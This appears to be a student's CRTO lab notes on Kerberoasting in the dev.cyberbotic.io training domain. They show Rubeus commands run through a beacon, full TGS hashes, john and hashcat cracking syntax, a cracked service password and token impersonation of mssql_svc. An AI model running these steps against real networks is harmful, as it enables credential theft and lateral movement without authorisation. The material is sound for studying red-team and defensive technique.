Services run on a machine under the context of a user account.
These accounts are either local to the machine (LocalSystem, LocalService, NetworkService) or are domain accounts (e.g. DOMAIN\mssql).
A Service Principal Name (SPN) is a unique identifier of a service instance.
SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.


on `WKSTN-2` as `bfarmer` utilize `Rubeus.exe` command below to `kerberoast` all  accounts in the domain that have a `SPN` (excluding `kgrbtgt`)
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap`

```powershell
[12/05 20:45:51] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
[12/05 20:45:57] [*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /simple /nowrap
[12/05 20:45:57] [+] host called home, sent: 550764 bytes
[12/05 20:45:58] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : dev.cyberbotic.io
[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[12/05 20:45:59] [+] received output:

[*] Total kerberoastable users : 3


[12/05 20:46:00] [+] received output:
$krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$90DD143069C38F36EC5498AB8D108E92$014E2F770D60C7FD213CC6AC52ED68862D9219EBFF2398F1F919709EE73F3F1FCA9F0A42A3CAF6BD52688AE327C497C6B35DAD3E82DFD0CD9AEC4FDDD1025015F30A165D41BDA3FFE643AECFF7F6921B5C41FC450445A6FF0906E3DC8FC4E0009D507FE871FEF04E7AD5B309A94D4172FE34415D3C1AE661572BA9270B60E97C1F1F3532800600213F5FDB4DC9D72208B699F49659A623DA879303B0691FC61F6D3757D7027D8401E317257889E935BF471304DE6DB39875DA575B53B946BA18B6DA72049BEA64BF76FA3AB88311A36CD3487058771C9CDF04E1EDCE0648BE9619345B6D75F9967B2F59B2831CD8F4EB07E3D7B664FE83FE6910F3AD3D658D5BFF481660E59E28F8D03331BA68A272CD97D1A5D5E370ED8E33AE04C97FF00DA8882908074BB76E14ADF63BB41623C8D2D60E09DA553A2B50FEC04C819C3D0F38AD1CE01CF516B1FF111C58DE78149DE94331CF085D37C2C0785195303A93A9AC0D9CF0D2BB83ECA46DFF161F22411F6AF34AD2F80FDBFBB6F8B53E18918BA1F63A1FC6B3BB6BB2163E3F56D0800325D3D4E90A31C8F9A82E2DEA9AE2DC1D0E09370E540D225A38032CBB503C472CEDBC1F4FCAD7D7AF3F79CC9DC03041282C245BA302003E666C8713E79129AFD9832632B9548C381D8E9D61BAE011289A6747B2E0DDA195A9D2EDD617B1121E2C7E8FB95F336136500AA1693CC9AE6FC767D7B2F3062B374B79CB659913FC55B67DB7613BA69373BAD3E537427D04BA16F3D9CE2D0CC03FE372C264D0601066EA5746CBF0DA4550D366FA98ABAD8F56C546CC90C31032D02B86DEC387E11D1A1FB57A81B17CB7ED588DD6973D2F8E1FC579A041C13F3E3FE3343B88A5A4D81117C6DFC42BB745E9685BB8E8E7668D62E96E1B0FCC43434CF195F026E067BE4F07CD42A969B75E3D775129BF3122CAB262ECB093625744C03BA1A44B377E8C93C5FE760919D78D7F740ABE242D6A99397F4832CD3A201B72F1E0DFBD434AB192803E3E41FD6F407F9E7E86A9CA63A5BC5E1E84FB1F8E142A262F736612601F6E3EB009D0045F7CC2A5D2998BC4AE3745CC9E470F70ABF01A8DAD9800EB9757FD0E3F1B4975C4AAB9E3ACCF34E907C2A9EFF71FD796523DBE02F101DBA435033C868B71A71EAFE416CE45169661BC12AA8360CFBE0513692C0ADDCA8CE524CCF262A1C3C67C311D56A3F821AD51A3AAD937C31791BDE6A3D06271F9AC629C1E078CA02201913E410D869B7965A81D6B840CDACA350D661A549C285FE5D10C80E351FCB900E9FE01A0B1502ECCDD7EF4F2607445698A4DF5400675D92DE83C2CB894CAAF0A5FE0975D554E2BCB080BBA0456A937B4A9243BABDCE52D7DDA9A545D5BCF18563EFC0D2805FA2B9747AB3B37C2FF07B0C7AE613B40E88553B14B3421BC7B60B46093A4652FA4C262D0CC46C9E0D7FC84777F33E24393DF7FC9B4C0C291C9C663FBF76BFE56302E0EBC0280BE13105C77149179E8DDFB11A9884E9C9F281C7F5D2C4350243CA89616D28292F2EA2929478AAF0AB63CEF7E703BEE4D41C9C00CE1B8181D282016B1322647B65B1D9DCBBB0415D8E1697869B44B05A7256A6DC28676DD43937C922D4AEDA7D011CE38E9F4B6E8
$krb5tgs$23$*squid_svc$dev.cyberbotic.io$HTTP/squid.dev.cyberbotic.io@dev.cyberbotic.io*$AF71C2F7D2374759585449861149F83C$4692005A972EE6F94E7C4EAB46B046F1300EE2057AC254BDD30F394F0917FB9166659E14F9EF478D4B56BF8A14E0CF24BD8F92FBD008ECBE570F84E93A2D0038757EA9A308F696B2E6BE4B6848AB4B4DA9F9DD640C184CACB668776CD2363D9420D3130A7F8214B2B8AE88B9E98D519263F3B634F33263AC9966CC853D5E9A439637C036FF9C857AF4B7DBE119441C4F1A432EF69AE57034836A31D4AFD271A2AC06059367F8F46ECB52AFC246DBBFB75A3CB4ED42B8D98F04BD105E3777649C120E75CF0F327B6C5E304DA0D5BFF1FD5033F438DB045C4FF30B748613272ED2949B7BBB795654FB59F5C86C70692953A54D30F30082763BF36BF253EF8B0F6BAA2E7715422DD20C4786F1861B523B3B4674EF41116D47A78D3E6B841F76557073F6E429D7FE1217FEFEBC7502224FF52C0F57C4086FBE50AAA6FBAF07FCBDFAAE1CAC49F083737BDA47DFDC3A067DFE7D4AAC57C511FF65FCCEDB3030856E4AEDCFBC45931C8AFB43CE8A92CE023C1C58FDBDF6617FAA17245F3095E54E7C1E08F446766A1686B63F9B32B1CA1A230C2AF8B2F29BD5059F391AFAB3FC0A5C787B5A04184DD6A7D59D2372E17529AB886C36B93E7CF1CD386A87CFB47703145A11DC7CB0B9799813F8F979571AE09632E40D324BDC2C0702CFBFF8BC572E649F4098033CDF35750063316E501DF4AC5278E6CCAA375F5717D62DDD43E395C6614530E52EEE493ADBB6158362940856CD61B305125CD4E0BCD6E46800EDE66874C34CDEF6ABF2FF3BDD2EADEA9ED7651161E221402868BFB4B184106E42F086439D1642A92091DF5508E862053E48B0EC1284E41FD7E62A663ABA53D2D7C05F62B514C92806A0DF809539D9D431C2320B5F3B9F5C2095EEE46150A7FF52866CB02CA6E6E9C260D950548D26FCD84E1EA3821A0E45E95DA28B1C5AD2E6EB130822A0974E54C4349BC9EEB7887CF061CD7225293B61650BA9F294F5D7E15922FB4BBA4C1D41196181BCA9B633D21BA29EC0820FAA4A96EDFDA2B68A4AD8C94A18060B1A6B2DE8FBA5B1A9710D8204AECD53101D6B61B2C2DFE03D6E9CEB0302271C249F2C72D4A6F5C60924F904F529618894C9C76109D779DE424C84A2F6FA9CA7AAAF7B981DD161A18FE49ACD68DD1F459AC7BC76FE7669DC21B2200B573E70705477AE259C62882FAB6DB495ED007F475EB00A2B3E0A1C72F03AF18411784D45D06603673B78317DB051700EF8C719AB8F8D655F4F7CD4410AE16F2D3D370B495A9EE5CE99A6FFD021D560656F25DBD3C3A6A4D3E0C0C153011B01869B70E7E87FA7FAF1E0D1CB4E9703ADF92E5296C296061E3F50CBBBC27496D9B9B2B987945E98FCA371388419BDC86C638E570143429961CE6D416CF1C52EB35038BB3494AC9835C107D586D3D3D5BAF90076AAD7F2AA1EC0F5660766F8D9680D13B94B9178BFDC4849524335AFF19766D0566A7D6F7AC6474E142739FB41C05403032AABDDC0F845709C7779A795C1063A4C8ED53806BD4CFA68723282C8A49FDA3E998F16FBB2AB66FA5AE40C0E15E98F8AA6C06948D461967F479C0CE906CF56A5D996E38476A5DAA054BF09A4CE35482C5A8D35C443CDE0ED7E8DB119762F5F42485836E0ED
$krb5tgs$23$*honey_svc$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io@dev.cyberbotic.io*$0DB39EDAF6012855EC778BDD4BCEB199$3192F87763BF460D8F2E3D7C3C3F16B80C7E4BA6E6C130003A223F4EF33DAE15ABCBF0383A42886DE51AC05D8F1475BCA52AEC2963E967E689B79A6D861E0C6182CB942F64FEBB67E56959AB0EDF15E01BE169B0A93904F57D7502B6812501C6F5B9BC61EF021A9C65B66FF55219FCF44D98F1F4F836FFE310234F4E8EA2ECAA1BB23AB2831F1DA6F76061ECC219613509E6877172C79367B69CAB44DB810B4697C284901081C27D76AD56E9BFAA3C9EF0AEF04A766CAAF21F86A7AE0915DC6E527AEAA1DFD19829F2F9F011DC3CC3F5997989F91CB3682E62317732E1E1C5FA4D399F31CBD1A12895FD2958201C99DDF9BAFB1E945EBEAE7A28A9D1FDA8FF5D21C12B0EF5F32694D63D589AFA424154C3C25EA70A0E8FEDC8CE9847285FB75646B2DD30C75F8AC210C9894D765100EBCFF20AAFF6987E2CE971036E625D58E41038052DF307DC4D34BE3B6F7B25B17DC4B8FAB5A6008EA4F010C92648BEA780884AEE85A4B9B5608CB39DE326F4A3D2B7AF70A3A88BACD3E543C362F22DC7DCDC5FB21CCD1AC1BB56EC90E6C597617A9BE8B12ECB6EBC3EBB099199AB5D3D80BEC04654DF96427CE3ACB54012DD288F170D038C732088A86A5DAD6BF39249956327C6BD360143182C8ADC3DDB68394FF30D7D39E061993F2ECC47CA47D58E9F89E7E23637258ECDCDE89CDE41CDFCE4FF73FC2530F883CC8094ABF5B7BD64BF46A78FFDADE31E1AE8D2EAD3B6FBC67879AACDF383862048F1DE572AD3721130603C41A52BE506F0C8614EDD96462C919796978F8101289ECD05D7701F413B44E1AAE57FDFDDB993482E2F808058650A6FC43A4B37668F30DC7E68A575FD883DA621ADCC14FB96740479F722DEB04C71FC445B11F72CB4CA2058850E208E6ED451ED502ABDF9613EEC4E97FC4501B36AC3A7A8E45B7DCD6612A26A162ECA30BDFA0249763FC938EA7199D695F078BF7DF98E32742DA1D5719798AC128ABFCF6DFB27D461D8A6E3747562153E256811455D8F3C71200CE8C649288B41C4831B30A8AA08AEA07785740344AE7E462231B22A8A3774A93823096C1342234DB645A91DECAAC1F123835C052ADEB2584ED2E6F6C6FE6D317D8734B264F1737EE9549240207947F912C13C2965C0E35F8E60247C7E62624382B2B2E8C079C25AB1E9A07B639A6396C089D291A6425E74A6CD5927E93FAAB599B09FC7EF68B8256AA873CA8AF09A0457786C7D6E350303762D7A4C4796499B9B47C570017DE1205D5379ACDF72FEA52E632B7E5808571B6D368A7F4FC2310C5E70B1E45DEAA82115E4BECD577B1379311A726FC8989A2BAF1931A59F4A8B7C2F084B53D2E27422138613F99D06FBBCEE62AA3BAF9ABAB8BB552F5E2F124501AB0E9E8EE2C74F18155E69FD943DACF57A57CE40A86A14FCC7D9E9D61596C269CF7E5DF2E3EB06ECF439A1BFC0CBABEBADD947522E9854AAB310F643B7F783505847B14414AD062AE8862F574FE92D91993D136E6AF4CB681182C056AD622C29521812FBC13E5D8B85CB84A873E715201E7C985C10E13EF7E32ED1CC1194CCF6E18CD4DCA590296493588E31BD1755BFB68D5A0CA362FEB7702CCE489DE326210382F3F2EF4423C5B3DA9071225B
```
These hashes can be cracked offline to recover the plaintext passwords for the accounts.  Use `--format=krb5tgs --wordlist=wordlist hashes` for john or `-a 0 -m 13100 hashes wordlist` for hashcat.
*CRTO does not provide a wordlist nor capability to crack passwords, must be done on personal computer*

```powershell
$ john --format=krb5tgs --wordlist=wordlist mssql_svc
Cyberb0tic       (mssql_svc$dev.cyberbotic.io)
```

Course Help:
  I experienced some hash format incompatibility with john.  Removing the SPN so it became: `$krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah]` seemed to address the issue.

# Safer Method

`enumerate` each individual user, first by identifying what `users` have an `SPN` set.
```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

[*] TOTAL NUMBER OF SEARCH RESULTS: 4
	[+] cn                   : krbtgt
	[+] servicePrincipalName : kadmin/changepw
	[+] samaccountname       : krbtgt
	
	[+] cn                   : MS SQL Service
	[+] servicePrincipalName : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
	[+] samaccountname       : mssql_svc
	
	[+] cn                   : Squid Proxy
	[+] servicePrincipalName : HTTP/squid.dev.cyberbotic.io
	[+] samaccountname       : squid_svc
	
	[+] cn                   : Honey Token
	[+] servicePrincipalName : HoneySvc/fake.dev.cyberbotic.io
	[+] samaccountname       : honey_svc
```
can `roast` the individual user that we are interested in 
```powershell
[12/05 21:07:33] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
[12/05 21:07:37] [*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:mssql_svc /nowrap
[12/05 21:07:38] [+] host called home, sent: 550780 bytes
[12/05 21:07:38] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssql_svc
[*] Target Domain          : dev.cyberbotic.io
[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssql_svc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : mssql_svc
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
[*] PwdLastSet             : 8/15/2022 7:46:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$90DD143069C38F36EC5498AB8D108E92$014E2F770D60C7FD213CC6AC52ED68862D9219EBFF2398F1F919709EE73F3F1FCA9F0A42A3CAF6BD52688AE327C497C6B35DAD3E82DFD0CD9AEC4FDDD1025015F30A165D41BDA3FFE643AECFF7F6921B5C41FC450445A6FF0906E3DC8FC4E0009D507FE871FEF04E7AD5B309A94D4172FE34415D3C1AE661572BA9270B60E97C1F1F3532800600213F5FDB4DC9D72208B699F49659A623DA879303B0691FC61F6D3757D7027D8401E317257889E935BF471304DE6DB39875DA575B53B946BA18B6DA72049BEA64BF76FA3AB88311A36CD3487058771C9CDF04E1EDCE0648BE9619345B6D75F9967B2F59B2831CD8F4EB07E3D7B664FE83FE6910F3AD3D658D5BFF481660E59E28F8D03331BA68A272CD97D1A5D5E370ED8E33AE04C97FF00DA8882908074BB76E14ADF63BB41623C8D2D60E09DA553A2B50FEC04C819C3D0F38AD1CE01CF516B1FF111C58DE78149DE94331CF085D37C2C0785195303A93A9AC0D9CF0D2BB83ECA46DFF161F22411F6AF34AD2F80FDBFBB6F8B53E18918BA1F63A1FC6B3BB6BB2163E3F56D0800325D3D4E90A31C8F9A82E2DEA9AE2DC1D0E09370E540D225A38032CBB503C472CEDBC1F4FCAD7D7AF3F79CC9DC03041282C245BA302003E666C8713E79129AFD9832632B9548C381D8E9D61BAE011289A6747B2E0DDA195A9D2EDD617B1121E2C7E8FB95F336136500AA1693CC9AE6FC767D7B2F3062B374B79CB659913FC55B67DB7613BA69373BAD3E537427D04BA16F3D9CE2D0CC03FE372C264D0601066EA5746CBF0DA4550D366FA98ABAD8F56C546CC90C31032D02B86DEC387E11D1A1FB57A81B17CB7ED588DD6973D2F8E1FC579A041C13F3E3FE3343B88A5A4D81117C6DFC42BB745E9685BB8E8E7668D62E96E1B0FCC43434CF195F026E067BE4F07CD42A969B75E3D775129BF3122CAB262ECB093625744C03BA1A44B377E8C93C5FE760919D78D7F740ABE242D6A99397F4832CD3A201B72F1E0DFBD434AB192803E3E41FD6F407F9E7E86A9CA63A5BC5E1E84FB1F8E142A262F736612601F6E3EB009D0045F7CC2A5D2998BC4AE3745CC9E470F70ABF01A8DAD9800EB9757FD0E3F1B4975C4AAB9E3ACCF34E907C2A9EFF71FD796523DBE02F101DBA435033C868B71A71EAFE416CE45169661BC12AA8360CFBE0513692C0ADDCA8CE524CCF262A1C3C67C311D56A3F821AD51A3AAD937C31791BDE6A3D06271F9AC629C1E078CA02201913E410D869B7965A81D6B840CDACA350D661A549C285FE5D10C80E351FCB900E9FE01A0B1502ECCDD7EF4F2607445698A4DF5400675D92DE83C2CB894CAAF0A5FE0975D554E2BCB080BBA0456A937B4A9243BABDCE52D7DDA9A545D5BCF18563EFC0D2805FA2B9747AB3B37C2FF07B0C7AE613B40E88553B14B3421BC7B60B46093A4652FA4C262D0CC46C9E0D7FC84777F33E24393DF7FC9B4C0C291C9C663FBF76BFE56302E0EBC0280BE13105C77149179E8DDFB11A9884E9C9F281C7F5D2C4350243CA89616D28292F2EA2929478AAF0AB63CEF7E703BEE4D41C9C00CE1B8181D282016B1322647B65B1D9DCBBB0415D8E1697869B44B05A7256A6DC28676DD43937C922D4AEDA7D011CE38E9F4B6E8
```

# Impersonating `mssql_svc` user

can [[Penetration Testing v2/crto_Defender/2. WKSTN2 - 1/4. user_Impersonation/7. Make Token|7. Make Token]] with the cracked credentials on `WKSTN-2` as `DEV\bfarmer`
```powershell
[12/05 21:11:09] beacon> make_token DEV\mssql_svc Cyberb0tic
[12/05 21:11:09] [*] Tasked beacon to create a token for DEV\mssql_svc
[12/05 21:11:09] [+] host called home, sent: 102 bytes
[12/05 21:11:10] [+] Impersonated DEV\mssql_svc (netonly)
```
![[Pasted image 20231205162444.png]]
